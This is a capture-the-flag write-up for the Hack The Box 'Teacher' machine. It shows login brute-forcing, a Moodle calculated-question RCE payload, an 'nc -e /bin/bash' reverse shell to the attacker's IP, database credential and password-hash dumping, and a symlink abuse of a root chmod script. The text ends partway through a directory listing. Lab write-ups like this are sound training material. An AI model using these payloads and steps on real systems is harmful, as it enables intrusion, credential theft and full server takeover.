@@ -1,0 +1,795 @@
+---
+layout: default
+title: Teacher
+---
+
+<div class="pretty-font">
+<h1>Teacher</h1>
+<p class="date">20/04/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/teacher/teacher.png">
+
+<p>Teacher is an interesting box, because to get user we will have to exploit a RCE vulnerability in a famous platform most of us had to deal with during our studies, and to escalate privileges we will have to find and understand a certain backup script.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>Run <code>nmap</code> to see we only have port <code>80</code> open with an Apache server running.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/teacher# nmap -sC -sV 10.10.10.153
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-19 12:18 UTC
+Nmap scan report for 10.10.10.153
+Host is up (0.37s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Blackhat highschool
+</pre>
+
+<p>In <code>http://10.10.10.153</code> we have a school website.</p>
+
+<img class="img-fluid" src="/static/img/htb/teacher/1.png">
+
+<p>Running <code>gobuster</code> we can see the following directories.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/teacher# /opt/gobuster/gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.153/
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.153/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/02/19 15:11:40 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/js (Status: 301)
+/manual (Status: 301)
+/moodle (Status: 301)
+/phpmyadmin (Status: 403)
+/server-status (Status: 403)
+=====================================================
+2019/02/19 15:12:38 Finished
+=====================================================
+</pre>
+
+<p>If we go to <code>/images</code> we can see a list of images, most of them of pixelated people but theres one (<code>5.png</code>) which gives us an error.</p>
+
+<p class="challenge-description">The image "http://10.10.10.153/images/5.png" cannot be displayed because it contains errors.</p>
+
+<p>So let's download it and view its content.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/teacher# wget http://10.10.10.153/images/5.png
+root@kali:~/htb/teacher# cat 5.png 
+Hi Servicedesk,
+
+I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
+
+Could you guys figure out what the last charachter is, or just reset it?
+
+Thanks,
+Giovanni
+</pre>
+
+<p>Giovanni is talking about his password to enter the moodle platform (<code>/moodle</code>) we also saw with <code>gobuster</code>.</p>
+
+<p>Using <code>burp</code> we can see the POST request format when performing the login action.</p>
+
+<img class="img-fluid" src="/static/img/htb/teacher/2.png">
+
+<p>We are only missing one character from <code>giovanni</code>'s password, so let's use <code>wfuzz</code> to try all the possibilities and see which gives us access. The <code>-L</code> option (follow redirects) is required because this POST request response is a redirection to the page where we know if the credentials were correct. We're also hiding all responses with 1224 words (<code>--hw 1224</code>) because it's the number of words the "invalid credentials" page has.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/teacher# wfuzz -w /usr/share/wordlists/SecLists/Fuzzing/alphanum-case-extra.txt -L -d "anchor=&username=giovanni&password=Th4C00lTheachaFUZZ" --hw 1224 http://10.10.10.153/moodle/login/index.php
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.153/moodle/login/index.php
+Total requests: 95
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000003:  C=200    296 L	    1257 W	  27569 Ch	  "#"
+</pre>
+
+<p>We now know the correct credentials are <code>giovanni/Th4C00lTheacha#</code> and we can enter to Moodle as a teacher.</p>
+
+<img class="img-fluid" src="/static/img/htb/teacher/3.png">
+
+<p>To find out the Moodle version I searched for <a href="https://docs.moodle.org/36/en/Moodle_version" target="_blank">Moodle version fingerprint</a> and found this:</p>
+
+<p class="challenge-description">For Moodle sites in English or German (only), if you are a regular teacher with no admin access, you might be able to find your Moodle version by clicking on "Moodle Docs for this page" at the bottom of any Moodle page when logged in.</p>
+
+<p>When visiting the Algebra page (<code>http://10.10.10.153/moodle/course/view.php?id=2</code>) we have the link "Moodle Docs for this page" sends us to <code>http://docs.moodle.org/34/en/course/view/topics</code>, so we're working with <code>3.4</code> version.</p>
+
+<p>For Moodle < 3.5.0 there's a remote code execution vulnerability explained <a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/" target="_blank">here</a> (the video was really helpful).</p> 
+
+<p>To exploit it follow the next steps.</p>
+
+<p>Config -> Turn editing on -> Add an activity or resource -> Select Quiz Add -> Fill and save.<br>
+Edit quiz -> Add -> a new question -> Select Calculated -> Fill required fields and<br>
+<b>Answer 1 formula = /*{a*/`$_GET[0]`;//{x}}<br>
+Grade = 100%</b><br>
+Save changes -> Next page</p>
+
+<p>Now if we add a <code>0</code> parameter in the URL, the content should be executed in the machine. To test it let's run a single <code>ping</code> against our machine.</p>
+
+<pre class="prettyprint">
+&0=(ping -c 1 10.10.16.38)
+</pre>
+
+<p>If we were listening with <code>tcpdump</code> we should have captured that <code>ping</code> request, meaning the RCE worked.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/teacher# tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+09:23:53.098921 IP 10.10.10.153 > kali: ICMP echo request, id 903, seq 1, length 64
+09:23:53.098931 IP kali > 10.10.10.153: ICMP echo reply, id 903, seq 1, length 64
+09:23:53.176647 IP 10.10.10.153 > kali: ICMP echo request, id 905, seq 1, length 64
+09:23:53.176657 IP kali > 10.10.10.153: ICMP echo reply, id 905, seq 1, length 64
+</pre>
+
+<p>Now instead of running a <code>ping</code> let's run <code>nc</code> to retrieve a reverse shell</p>
+
+<pre class="prettyprint">
+&0=(nc 10.10.16.38 6969 -e /bin/bash)
+</pre>
+
+<p>If we were listening in the specified port we should get a reverse shell as <code>www-data</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/teacher# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.153.
+Ncat: Connection from 10.10.10.153:38580.
+whoami
+www-data
+</pre>
+
+<p>Upgrade the shell with <code>python</code>.</p>
+
+<pre class="prettyprint">
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@teacher:/var/www/html/moodle/question$ 
+</pre>
+
+<p>Looking through the Moodle files, we have <code>config.php</code> with some sql credentials.</p>
+
+<pre class="prettyprint">
+www-data@teacher:/var/www/html/moodle$ cat config.php
+cat config.php
+<?php  // Moodle configuration file
+
+unset($CFG);
+global $CFG;
+$CFG = new stdClass();
+
+$CFG->dbtype    = 'mariadb';
+$CFG->dblibrary = 'native';
+$CFG->dbhost    = 'localhost';
+$CFG->dbname    = 'moodle';
+$CFG->dbuser    = 'root';
+$CFG->dbpass    = 'Welkom1!';
+$CFG->prefix    = 'mdl_';
+$CFG->dboptions = array (
+  'dbpersist' => 0,
+  'dbport' => 3306,
+  'dbsocket' => '',
+  'dbcollation' => 'utf8mb4_unicode_ci',
+);
+...
+</pre>
+
+<p>Connect to the <code>mysql</code> console.</p>
+
+<pre class="prettyprint">
+www-data@teacher:/var/www/html/moodle$ mysql -u root -pWelkom1! -D moodle
+mysql -u root -pWelkom1! -D moodle
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 686
+Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [moodle]> 
+</pre>
+
+<p>We have the following databases.</p>
+
+<pre class="prettyprint">
+MariaDB [moodle]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| moodle             |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
++--------------------+
+5 rows in set (0.00 sec)
+</pre>
+
+<p>Inside of <code>moodle</code> database there are hundreds of tables.</p>
+
+<pre class="prettyprint long">
+MariaDB [moodle]>  tables;
+show tables;
++----------------------------------+
+| Tables_in_moodle                 |
++----------------------------------+
+| mdl_analytics_indicator_calc     |
+| mdl_analytics_models             |
+| mdl_analytics_models_log         |
+| mdl_analytics_predict_samples    |
+| mdl_analytics_prediction_actions |
+| mdl_analytics_predictions        |
+| mdl_analytics_train_samples      |
+| mdl_analytics_used_analysables   |
+| mdl_analytics_used_files         |
+| mdl_assign                       |
+| mdl_assign_grades                |
+| mdl_assign_overrides             |
+| mdl_assign_plugin_config         |
+| mdl_assign_submission            |
+| mdl_assign_user_flags            |
+| mdl_assign_user_mapping          |
+| mdl_assignfeedback_comments      |
+| mdl_assignfeedback_editpdf_annot |
+| mdl_assignfeedback_editpdf_cmnt  |
+| mdl_assignfeedback_editpdf_queue |
+| mdl_assignfeedback_editpdf_quick |
+| mdl_assignfeedback_file          |
+| mdl_assignment                   |
+| mdl_assignment_submissions       |
+| mdl_assignment_upgrade           |
+| mdl_assignsubmission_file        |
+| mdl_assignsubmission_onlinetext  |
+| mdl_auth_oauth2_linked_login     |
+| mdl_backup_controllers           |
+| mdl_backup_courses               |
+| mdl_backup_logs                  |
+| mdl_badge                        |
+| mdl_badge_backpack               |
+| mdl_badge_criteria               |
+| mdl_badge_criteria_met           |
+| mdl_badge_criteria_param         |
+| mdl_badge_external               |
+| mdl_badge_issued                 |
+| mdl_badge_manual_award           |
+| mdl_block                        |
+| mdl_block_community              |
+| mdl_block_instances              |
+| mdl_block_positions              |
+| mdl_block_recent_activity        |
+| mdl_block_rss_client             |
+| mdl_blog_association             |
+| mdl_blog_external                |
+| mdl_book                         |
+| mdl_book_chapters                |
+| mdl_cache_filters                |
+| mdl_cache_flags                  |
+| mdl_capabilities                 |
+| mdl_chat                         |
+| mdl_chat_messages                |
+| mdl_chat_messages_current        |
+| mdl_chat_users                   |
+| mdl_choice                       |
+| mdl_choice_answers               |
+| mdl_choice_options               |
+| mdl_cohort                       |
+| mdl_cohort_members               |
+| mdl_comments                     |
+| mdl_competency                   |
+| mdl_competency_coursecomp        |
+| mdl_competency_coursecompsetting |
+| mdl_competency_evidence          |
+| mdl_competency_framework         |
+| mdl_competency_modulecomp        |
+| mdl_competency_plan              |
+| mdl_competency_plancomp          |
+| mdl_competency_relatedcomp       |
+| mdl_competency_template          |
+| mdl_competency_templatecohort    |
+| mdl_competency_templatecomp      |
+| mdl_competency_usercomp          |
+| mdl_competency_usercompcourse    |
+| mdl_competency_usercompplan      |
+| mdl_competency_userevidence      |
+| mdl_competency_userevidencecomp  |
+| mdl_config                       |
+| mdl_config_log                   |
+| mdl_config_plugins               |
+| mdl_context                      |
+| mdl_context_temp                 |
+| mdl_course                       |
+| mdl_course_categories            |
+| mdl_course_completion_aggr_methd |
+| mdl_course_completion_crit_compl |
+| mdl_course_completion_criteria   |
+| mdl_course_completion_defaults   |
+| mdl_course_completions           |
+| mdl_course_format_options        |
+| mdl_course_modules               |
+| mdl_course_modules_completion    |
+| mdl_course_published             |
+| mdl_course_request               |
+| mdl_course_sections              |
+| mdl_data                         |
+| mdl_data_content                 |
+| mdl_data_fields                  |
+| mdl_data_records                 |
+| mdl_editor_atto_autosave         |
+| mdl_enrol                        |
+| mdl_enrol_flatfile               |
+| mdl_enrol_lti_lti2_consumer      |
+| mdl_enrol_lti_lti2_context       |
+| mdl_enrol_lti_lti2_nonce         |
+| mdl_enrol_lti_lti2_resource_link |
+| mdl_enrol_lti_lti2_share_key     |
+| mdl_enrol_lti_lti2_tool_proxy    |
+| mdl_enrol_lti_lti2_user_result   |
+| mdl_enrol_lti_tool_consumer_map  |
+| mdl_enrol_lti_tools              |
+| mdl_enrol_lti_users              |
+| mdl_enrol_paypal                 |
+| mdl_event                        |
+| mdl_event_subscriptions          |
+| mdl_events_handlers              |
+| mdl_events_queue                 |
+| mdl_events_queue_handlers        |
+| mdl_external_functions           |
+| mdl_external_services            |
+| mdl_external_services_functions  |
+| mdl_external_services_users      |
+| mdl_external_tokens              |
+| mdl_feedback                     |
+| mdl_feedback_completed           |
+| mdl_feedback_completedtmp        |
+| mdl_feedback_item                |
+| mdl_feedback_sitecourse_map      |
+| mdl_feedback_template            |
+| mdl_feedback_value               |
+| mdl_feedback_valuetmp            |
+| mdl_file_conversion              |
+| mdl_files                        |
+| mdl_files_reference              |
+| mdl_filter_active                |
+| mdl_filter_config                |
+| mdl_folder                       |
+| mdl_forum                        |
+| mdl_forum_digests                |
+| mdl_forum_discussion_subs        |
+| mdl_forum_discussions            |
+| mdl_forum_posts                  |
+| mdl_forum_queue                  |
+| mdl_forum_read                   |
+| mdl_forum_subscriptions          |
+| mdl_forum_track_prefs            |
+| mdl_glossary                     |
+| mdl_glossary_alias               |
+| mdl_glossary_categories          |
+| mdl_glossary_entries             |
+| mdl_glossary_entries_categories  |
+| mdl_glossary_formats             |
+| mdl_grade_categories             |
+| mdl_grade_categories_history     |
+| mdl_grade_grades                 |
+| mdl_grade_grades_history         |
+| mdl_grade_import_newitem         |
+| mdl_grade_import_values          |
+| mdl_grade_items                  |
+| mdl_grade_items_history          |
+| mdl_grade_letters                |
+| mdl_grade_outcomes               |
+| mdl_grade_outcomes_courses       |
+| mdl_grade_outcomes_history       |
+| mdl_grade_settings               |
+| mdl_grading_areas                |
+| mdl_grading_definitions          |
+| mdl_grading_instances            |
+| mdl_gradingform_guide_comments   |
+| mdl_gradingform_guide_criteria   |
+| mdl_gradingform_guide_fillings   |
+| mdl_gradingform_rubric_criteria  |
+| mdl_gradingform_rubric_fillings  |
+| mdl_gradingform_rubric_levels    |
+| mdl_groupings                    |
+| mdl_groupings_groups             |
+| mdl_groups                       |
+| mdl_groups_members               |
+| mdl_imscp                        |
+| mdl_label                        |
+| mdl_lesson                       |
+| mdl_lesson_answers               |
+| mdl_lesson_attempts              |
+| mdl_lesson_branch                |
+| mdl_lesson_grades                |
+| mdl_lesson_overrides             |
+| mdl_lesson_pages                 |
+| mdl_lesson_timer                 |
+| mdl_license                      |
+| mdl_lock_db                      |
+| mdl_log                          |
+| mdl_log_display                  |
+| mdl_log_queries                  |
+| mdl_logstore_standard_log        |
+| mdl_lti                          |
+| mdl_lti_submission               |
+| mdl_lti_tool_proxies             |
+| mdl_lti_tool_settings            |
+| mdl_lti_types                    |
+| mdl_lti_types_config             |
+| mdl_message                      |
+| mdl_message_airnotifier_devices  |
+| mdl_message_contacts             |
+| mdl_message_popup                |
+| mdl_message_processors           |
+| mdl_message_providers            |
+| mdl_message_read                 |
+| mdl_message_working              |
+| mdl_messageinbound_datakeys      |
+| mdl_messageinbound_handlers      |
+| mdl_messageinbound_messagelist   |
+| mdl_mnet_application             |
+| mdl_mnet_host                    |
+| mdl_mnet_host2service            |
+| mdl_mnet_log                     |
+| mdl_mnet_remote_rpc              |
+| mdl_mnet_remote_service2rpc      |
+| mdl_mnet_rpc                     |
+| mdl_mnet_service                 |
+| mdl_mnet_service2rpc             |
+| mdl_mnet_session                 |
+| mdl_mnet_sso_access_control      |
+| mdl_mnetservice_enrol_courses    |
+| mdl_mnetservice_enrol_enrolments |
+| mdl_modules                      |
+| mdl_my_pages                     |
+| mdl_oauth2_endpoint              |
+| mdl_oauth2_issuer                |
+| mdl_oauth2_system_account        |
+| mdl_oauth2_user_field_mapping    |
+| mdl_page                         |
+| mdl_portfolio_instance           |
+| mdl_portfolio_instance_config    |
+| mdl_portfolio_instance_user      |
+| mdl_portfolio_log                |
+| mdl_portfolio_mahara_queue       |
+| mdl_portfolio_tempdata           |
+| mdl_post                         |
+| mdl_profiling                    |
+| mdl_qtype_ddimageortext          |
+| mdl_qtype_ddimageortext_drags    |
+| mdl_qtype_ddimageortext_drops    |
+| mdl_qtype_ddmarker               |
+| mdl_qtype_ddmarker_drags         |
+| mdl_qtype_ddmarker_drops         |
+| mdl_qtype_essay_options          |
+| mdl_qtype_match_options          |
+| mdl_qtype_match_subquestions     |
+| mdl_qtype_multichoice_options    |
+| mdl_qtype_randomsamatch_options  |
+| mdl_qtype_shortanswer_options    |
+| mdl_question                     |
+| mdl_question_answers             |
+| mdl_question_attempt_step_data   |
+| mdl_question_attempt_steps       |
+| mdl_question_attempts            |
+| mdl_question_calculated          |
+| mdl_question_calculated_options  |
+| mdl_question_categories          |
+| mdl_question_dataset_definitions |
+| mdl_question_dataset_items       |
+| mdl_question_datasets            |
+| mdl_question_ddwtos              |
+| mdl_question_gapselect           |
+| mdl_question_hints               |
+| mdl_question_multianswer         |
+| mdl_question_numerical           |
+| mdl_question_numerical_options   |
+| mdl_question_numerical_units     |
+| mdl_question_response_analysis   |
+| mdl_question_response_count      |
+| mdl_question_statistics          |
+| mdl_question_truefalse           |
+| mdl_question_usages              |
+| mdl_quiz                         |
+| mdl_quiz_attempts                |
+| mdl_quiz_feedback                |
+| mdl_quiz_grades                  |
+| mdl_quiz_overrides               |
+| mdl_quiz_overview_regrades       |
+| mdl_quiz_reports                 |
+| mdl_quiz_sections                |
+| mdl_quiz_slots                   |
+| mdl_quiz_statistics              |
+| mdl_rating                       |
+| mdl_registration_hubs            |
+| mdl_repository                   |
+| mdl_repository_instance_config   |
+| mdl_repository_instances         |
+| mdl_repository_onedrive_access   |
+| mdl_resource                     |
+| mdl_resource_old                 |
+| mdl_role                         |
+| mdl_role_allow_assign            |
+| mdl_role_allow_override          |
+| mdl_role_allow_switch            |
+| mdl_role_assignments             |
+| mdl_role_capabilities            |
+| mdl_role_context_levels          |
+| mdl_role_names                   |
+| mdl_role_sortorder               |
+| mdl_scale                        |
+| mdl_scale_history                |
+| mdl_scorm                        |
+| mdl_scorm_aicc_session           |
+| mdl_scorm_scoes                  |
+| mdl_scorm_scoes_data             |
+| mdl_scorm_scoes_track            |
+| mdl_scorm_seq_mapinfo            |
+| mdl_scorm_seq_objective          |
+| mdl_scorm_seq_rolluprule         |
+| mdl_scorm_seq_rolluprulecond     |
+| mdl_scorm_seq_rulecond           |
+| mdl_scorm_seq_ruleconds          |
+| mdl_search_index_requests        |
+| mdl_sessions                     |
+| mdl_stats_daily                  |
+| mdl_stats_monthly                |
+| mdl_stats_user_daily             |
+| mdl_stats_user_monthly           |
+| mdl_stats_user_weekly            |
+| mdl_stats_weekly                 |
+| mdl_survey                       |
+| mdl_survey_analysis              |
+| mdl_survey_answers               |
+| mdl_survey_questions             |
+| mdl_tag                          |
+| mdl_tag_area                     |
+| mdl_tag_coll                     |
+| mdl_tag_correlation              |
+| mdl_tag_instance                 |
+| mdl_task_adhoc                   |
+| mdl_task_scheduled               |
+| mdl_tool_cohortroles             |
+| mdl_tool_customlang              |
+| mdl_tool_customlang_components   |
+| mdl_tool_monitor_events          |
+| mdl_tool_monitor_history         |
+| mdl_tool_monitor_rules           |
+| mdl_tool_monitor_subscriptions   |
+| mdl_tool_recyclebin_category     |
+| mdl_tool_recyclebin_course       |
+| mdl_tool_usertours_steps         |
+| mdl_tool_usertours_tours         |
+| mdl_upgrade_log                  |
+| mdl_url                          |
+| mdl_user                         |
+| mdl_user_devices                 |
+| mdl_user_enrolments              |
+| mdl_user_info_category           |
+| mdl_user_info_data               |
+| mdl_user_info_field              |
+| mdl_user_lastaccess              |
+| mdl_user_password_history        |
+| mdl_user_password_resets         |
+| mdl_user_preferences             |
+| mdl_user_private_key             |
+| mdl_wiki                         |
+| mdl_wiki_links                   |
+| mdl_wiki_locks                   |
+| mdl_wiki_pages                   |
+| mdl_wiki_subwikis                |
+| mdl_wiki_synonyms                |
+| mdl_wiki_versions                |
+| mdl_workshop                     |
+| mdl_workshop_aggregations        |
+| mdl_workshop_assessments         |
+| mdl_workshop_assessments_old     |
+| mdl_workshop_comments_old        |
+| mdl_workshop_elements_old        |
+| mdl_workshop_grades              |
+| mdl_workshop_grades_old          |
+| mdl_workshop_old                 |
+| mdl_workshop_rubrics_old         |
+| mdl_workshop_stockcomments_old   |
+| mdl_workshop_submissions         |
+| mdl_workshop_submissions_old     |
+| mdl_workshopallocation_scheduled |
+| mdl_workshopeval_best_settings   |
+| mdl_workshopform_accumulative    |
+| mdl_workshopform_comments        |
+| mdl_workshopform_numerrors       |
+| mdl_workshopform_numerrors_map   |
+| mdl_workshopform_rubric          |
+| mdl_workshopform_rubric_config   |
+| mdl_workshopform_rubric_levels   |
++----------------------------------+
+388 rows in set (0.01 sec)
+</pre>
+
+<p>And if we view the contents of <code>mdl_user</code> we have some users with their corresponding passwords.</p>
+
+<pre class="prettyprint">
+MariaDB [moodle]> select * from mdl_user;
+select * from mdl_user;
++------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
+| id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename |
++------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
+|    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | This user is a special user that allows read-only access to some courses. |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |
+|    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |        |       0 |     |                                                                           |                 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |            0 | NULL     |                  |                   |            |               |
+|    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1550655334 | 1550655159 |   1550655250 | 10.10.13.113  |        |       0 |     |                                                                           |                 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1530059291 |            0 |          |                  |                   |            |               |
+| 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | NULL                                                                      |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |
++------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
+4 rows in set (0.00 sec)
+</pre>
+
+<p>Using <a href="https://md5decrypt.net" target="_blank">md5decrypt</a> we can crack that md5 password hash.</p>
+
+<pre class="prettyprint">
+7a860966115182402ed06375cf0a22af : expelled 
+</pre>
+
+<p>Now we can change to <code>giovanni</code> using the obtained password.</p>
+
+<pre class="prettyprint">
+www-data@teacher:/var/www/html/moodle$ su giovanni
+su giovanni
+Password: expelled
+
+giovanni@teacher:/var/www/html/moodle$ 
+</pre>
+
+<p>In his home directory we have the user flag.</p>
+
+<pre class="prettyprint">
+giovanni@teacher:~$ cat user.txt
+cat user.txt
+<span flag="fa9ae187462530e841d9e61936648fa7">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>Running <code>pspy</code> we can see a strange script being executed by root (<code>UID=0</code>) every few seconds.</p>
+
+<pre class="prettyprint">
+www-data@teacher:/tmp$ ./pspy32s
+...
+2019/02/20 11:42:01 CMD: UID=0    PID=3273   | /bin/bash /usr/bin/backup.sh 
+...
+</pre>
+
+<p>Let's see what does <code>backup.sh</code> do.</p>
+
+<pre class="prettyprint">
+giovanni@teacher:/usr/bin$ cat backup.sh
+cat backup.sh
+#!/bin/bash
+cd /home/giovanni/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+chmod 777 * -R;
+</pre>
+
+<p>What is interesting here is the <code>chmod 777 * -R;</code> command. This is giving full permissions to everyone for everything whats in that directory. Since this is being executed in <code>/home/giovanni/work/tmp</code> (<code>cd /home/giovanni/work;...;cd tmp;</code>) we can create a symbolic link there and the script will give full permissions to what's linked. So let's try to create a symbolic link to <code>/</code> directly.</p>
+
+<pre class="prettyprint">
+giovanni@teacher:~/work/tmp$ ln -s / caca
+</pre>
+
+<p>These are the permissions before the script is executed.</p>
+
+<pre class="prettyprint">
+giovanni@teacher:~/work/tmp$ ls -la /
+ls -la /
+total 84
+drwxr-xr-x  22 root root  4096 Oct 28 16:36 .
+drwxr-xr-x  22 root root  4096 Oct 28 16:36 ..
+drwxr-xr-x   2 root root  4096 Oct 28 16:40 bin
+drwxr-xr-x   3 root root  4096 Oct 28 16:40 boot
+drwxr-xr-x  17 root root  3080 Feb 20 11:34 dev
+drwxr-xr-x  84 root root  4096 Oct 28 16:40 etc
+drwxr-xr-x   3 root root  4096 Jun 27  2018 home
+lrwxrwxrwx   1 root root    29 Oct 28 16:36 initrd.img -> boot/initrd.img-4.9.0-8-amd64
+lrwxrwxrwx   1 root root    29 Oct 28 16:36 initrd.img.old -> boot/initrd.img-4.9.0-6-amd64
+drwxr-xr-x  15 root root  4096 Jun 27  2018 lib
+drwxr-xr-x   2 root root  4096 Jun 27  2018 lib64
+drwx------   2 root root 16384 Jun 27  2018 lost+found
+drwxr-xr-x   3 root root  4096 Jun 27  2018 media
+drwxr-xr-x   2 root root  4096 Jun 27  2018 mnt
+drwxr-xr-x   2 root root  4096 Jun 27  2018 opt
+dr-xr-xr-x 112 root root     0 Feb 20 11:34 proc
+drwx------   3 root root  4096 Nov  4 20:03 root
+drwxr-xr-x  18 root root   500 Feb 20 11:34 run
+drwxr-xr-x   2 root root  4096 Oct 28 16:40 sbin
+drwxr-xr-x   2 root root  4096 Jun 27  2018 srv
+dr-xr-xr-x  13 root root     0 Feb 20 11:45 sys
+drwxrwxrwt   2 root root  4096 Feb 20 11:45 tmp
+drwxr-xr-x  10 root root  4096 Jun 27  2018 usr
+drwxr-xr-x  12 root root  4096 Jun 27  2018 var
+lrwxrwxrwx   1 root root    26 Oct 28 16:36 vmlinuz -> boot/vmlinuz-4.9.0-8-amd64
+lrwxrwxrwx   1 root root    26 Oct 28 16:36 vmlinuz.old -> boot/vmlinuz-4.9.0-6-amd64
+</pre>
+
+<p>And these are the permissions after the execution of the script. Observe how now we can access everywhere.</p>
+
+<pre class="prettyprint">
+giovanni@teacher:~/work/tmp$ ls -la /
+ls -la /
+total 84
+drwxrwxrwx  22 root root  4096 Oct 28 16:36 .
+drwxrwxrwx  22 root root  4096 Oct 28 16:36 ..
+drwxrwxrwx   2 root root  4096 Oct 28 16:40 bin
+drwxrwxrwx   3 root root  4096 Oct 28 16:40 boot
+drwxrwxrwx  17 root root  3080 Feb 20 11:34 dev
+drwxrwxrwx  84 root root  4096 Oct 28 16:40 etc
+drwxrwxrwx   3 root root  4096 Jun 27  2018 home
+lrwxrwxrwx   1 root root    29 Oct 28 16:36 initrd.img -> boot/initrd.img-4.9.0-8-amd64
+lrwxrwxrwx   1 root root    29 Oct 28 16:36 initrd.img.old -> boot/initrd.img-4.9.0-6-amd64
+drwxrwxrwx  15 root root  4096 Jun 27  2018 lib
